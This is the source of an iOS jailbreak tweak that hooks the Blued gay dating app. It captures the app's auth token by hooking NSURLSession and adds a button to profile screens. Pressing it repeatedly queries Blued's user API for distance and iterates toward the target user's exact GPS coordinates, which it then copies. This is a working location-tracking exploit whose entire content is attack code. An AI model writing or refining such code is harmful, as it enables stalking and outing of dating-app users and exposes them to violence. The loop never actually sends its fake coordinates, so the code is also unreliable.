#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <math.h>
#import <objc/runtime.h>

// 核心配置
#define TRACK_BTN_TAG 100001
#define EARTH_RADIUS_KM 111.32
#define BLUED_BUNDLE_ID @"com.bluecity.blued"

// 全局静态状态
static NSString *g_bluedBasicToken = nil;
static NSString *g_currentTargetUid = nil;
static double g_initialDistance = -1.0;

@interface UIViewController (TrackHook)
- (UIWindow *)th_getSafeKeyWindow;
- (double)th_fetchDistanceWithUid:(NSString *)uid token:(NSString *)token fakeLat:(double)lat fakeLng:(double)lng;
- (void)th_showToast:(NSString *)msg duration:(NSTimeInterval)dur;
- (void)th_autoFetchUserInfo;
- (void)th_onBtnClick;
- (void)th_addBtn;
- (void)th_handlePan:(UIPanGestureRecognizer *)pan;
@end

%hook UIViewController

// 1. 增强型 Window 获取（解决 iOS 16 不显示按钮的核心）
%new
- (UIWindow *)th_getSafeKeyWindow {
    UIWindow *foundWindow = nil;
    if (@available(iOS 13.0, *)) {
        for (UIScene *scene in [UIApplication sharedApplication].connectedScenes) {
            if (scene.activationState == UISceneActivationStateForegroundActive && [scene isKindOfClass:[UIWindowScene class]]) {
                UIWindowScene *windowScene = (UIWindowScene *)scene;
                for (UIWindow *window in windowScene.windows) {
                    if (window.isKeyWindow) {
                        foundWindow = window;
                        break;
                    }
                }
            }
        }
    }
    if (!foundWindow) {
        foundWindow = [UIApplication sharedApplication].keyWindow;
    }
    return foundWindow;
}

// 2. 核心网络请求：获取实时距离
%new
- (double)th_fetchDistanceWithUid:(NSString *)uid token:(NSString *)token fakeLat:(double)lat fakeLng:(double)lng {
    if (!uid || !token) return -1.0;
    
    NSString *urlStr = [NSString stringWithFormat:@"https://argo.blued.cn/users/%@/basic", uid];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:urlStr]];
    req.HTTPMethod = @"GET";
    [req setValue:[NSString stringWithFormat:@"Basic %@", token] forHTTPHeaderField:@"Authorization"];
    [req setValue:@"Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15" forHTTPHeaderField:@"User-Agent"];
    req.timeoutInterval = 3.0;

    __block double resultDist = -1.0;
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);

    [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (!error && data) {
            NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
            if (json && json[@"data"] && json[@"data"][@"distance"]) {
                resultDist = [json[@"data"][@"distance"] doubleValue];
            }
        }
        dispatch_semaphore_signal(sem);
    }] resume];

    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3.5 * NSEC_PER_SEC)));
    return resultDist;
}

// 3. 点击事件：递归几何算法
%new
- (void)th_onBtnClick {
    // 【关键修复】防止 0x10 闪退：校验指针合法性
    if (!self || (uintptr_t)self < 0x100) return;

    [self th_autoFetchUserInfo];
    if (!g_currentTargetUid) { [self th_showToast:@"未识别到目标ID" duration:2.0]; return; }
    if (!g_bluedBasicToken) { [self th_showToast:@"缺少Token，请刷新列表" duration:2.0]; return; }

    NSUserDefaults *ud = [[NSUserDefaults alloc] initWithSuiteName:BLUED_BUNDLE_ID];
    double lat = [ud doubleForKey:@"current_latitude"];
    double lng = [ud doubleForKey:@"current_longitude"];
    if (lat == 0) { [self th_showToast:@"无法获取自身GPS坐标" duration:2.0]; return; }

    [self th_showToast:@"🛰️ 卫星递归扫描中..." duration:1.5];

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        double cLat = lat, cLng = lng, cDist = g_initialDistance;
        for (int i=0; i<8; i++) {
            double oLng = cLng + (cDist / (EARTH_RADIUS_KM * cos(cLat * M_PI/180)));
            double nDist = [self th_fetchDistanceWithUid:g_currentTargetUid token:g_bluedBasicToken fakeLat:cLat fakeLng:oLng];
            if (nDist < 0) break;
            cLng = (cLng + oLng) / 2.0;
            cDist = (cDist + nDist) / 2.0;
        }
        
        dispatch_async(dispatch_get_main_queue(), ^{
            NSString *msg = [NSString stringWithFormat:@"收敛成功!\nLat: %.6f\nLng: %.6f", cLat, cLng];
            UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"定位结果" message:msg preferredStyle:UIAlertControllerStyleAlert];
            [alert addAction:[UIAlertAction actionWithTitle:@"复制坐标" style:UIAlertActionStyleDefault handler:^(UIAlertAction *action) {
                [UIPasteboard generalPasteboard].string = [NSString stringWithFormat:@"%.6f,%.6f", cLat, cLng];
            }]];
            [alert addAction:[UIAlertAction actionWithTitle:@"确定" style:UIAlertActionStyleCancel handler:nil]];
            [[self th_getSafeKeyWindow].rootViewController presentViewController:alert animated:YES completion:nil];
        });
    });
}

// 4. 动态提取属性 (兼容混淆)
%new
- (void)th_autoFetchUserInfo {
    @try {
        unsigned int count = 0;
        objc_property_t *props = class_copyPropertyList([self class], &count);
        for (int i=0; i<count; i++) {
            NSString *name = [NSString stringWithUTF8String:property_getName(props[i])];
            id obj = [self valueForKey:name];
            if (!obj) continue;
            
            id uid = nil;
            if ([obj respondsToSelector:NSSelectorFromString(@"uid")]) uid = [obj valueForKey:@"uid"];
            else if ([obj respondsToSelector:NSSelectorFromString(@"user_id")]) uid = [obj valueForKey:@"user_id"];
            
            if (uid) {
                g_currentTargetUid = [NSString stringWithFormat:@"%@", uid];
                if ([obj respondsToSelector:NSSelectorFromString(@"distance")]) {
                    g_initialDistance = [[obj valueForKey:@"distance"] doubleValue];
                }
                break;
            }
        }
        free(props);
    } @catch (NSException *e) {}
}

// 5. UI 注入逻辑
%new
- (void)th_addBtn {
    dispatch_async(dispatch_get_main_queue(), ^{
        UIWindow *win = [self th_getSafeKeyWindow];
        if (!win || [win viewWithTag:TRACK_BTN_TAG]) return;

        UIButton *btn = [UIButton buttonWithType:UIButtonTypeCustom];
        btn.tag = TRACK_BTN_TAG;
        btn.frame = CGRectMake(win.bounds.size.width - 80, win.bounds.size.height / 2, 60, 60);
        btn.backgroundColor = [UIColor colorWithRed:0 green:0.5 blue:1.0 alpha:0.8];
        [btn setTitle:@"🛰️" forState:UIControlStateNormal];
        btn.layer.cornerRadius = 30;
        btn.layer.zPosition = 9999;
        
        [btn addTarget:self action:@selector(th_onBtnClick) forControlEvents:UIControlEventTouchUpInside];
        
        // 增加拖动手势支持
        UIPanGestureRecognizer *pan = [[UIPanGestureRecognizer alloc] initWithTarget:self action:@selector(th_handlePan:)];
        [btn addGestureRecognizer:pan];
        
        [win addSubview:btn];
    });
}

%new
- (void)th_handlePan:(UIPanGestureRecognizer *)pan {
    UIView *btn = pan.view;
    CGPoint trans = [pan translationInView:btn.superview];
    btn.center = CGPointMake(btn.center.x + trans.x, btn.center.y + trans.y);
    [pan setTranslation:CGPointZero inView:btn.superview];
}

%new
- (void)th_showToast:(NSString *)msg duration:(NSTimeInterval)dur {
    dispatch_async(dispatch_get_main_queue(), ^{
        UIWindow *win = [self th_getSafeKeyWindow];
        if (!win) return;
        UILabel *lab = [[UILabel alloc] initWithFrame:CGRectMake(0,0,220,60)];
        lab.center = CGPointMake(win.bounds.size.width/2, win.bounds.size.height * 0.8);
        lab.backgroundColor = [[UIColor blackColor] colorWithAlphaComponent:0.7];
        lab.textColor = [UIColor whiteColor];
        lab.textAlignment = NSTextAlignmentCenter;
        lab.text = msg;
        lab.layer.cornerRadius = 10;
        lab.clipsToBounds = YES;
        [win addSubview:lab];
        [UIView animateWithDuration:0.5 delay:dur options:0 animations:^{ lab.alpha = 0; } completion:^(BOOL f){ [lab removeFromSuperview]; }];
    });
}

- (void)viewDidAppear:(BOOL)animated {
    %orig;
    NSString *cls = NSStringFromClass([self class]);
    // 扩大匹配范围： Detail / User / Profile
    if ([cls containsString:@"Detail"] || [cls containsString:@"User"] || [cls containsString:@"Profile"]) {
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            [self th_addBtn];
        });
    }
}
%end

// 6. Token 抓取
%hook NSURLSession
- (NSURLSessionDataTask *)dataTaskWithRequest:(NSURLRequest *)request completionHandler:(void (^)(NSData *data, NSURLResponse *response, NSError *error))completionHandler {
    if (request && request.allHTTPHeaderFields[@"Authorization"]) {
        NSString *auth = request.allHTTPHeaderFields[@"Authorization"];
        if ([auth hasPrefix:@"Basic "]) {
            g_bluedBasicToken = [[auth substringFromIndex:6] copy];
        }
    }
    return %orig(request, completionHandler);
}
%end
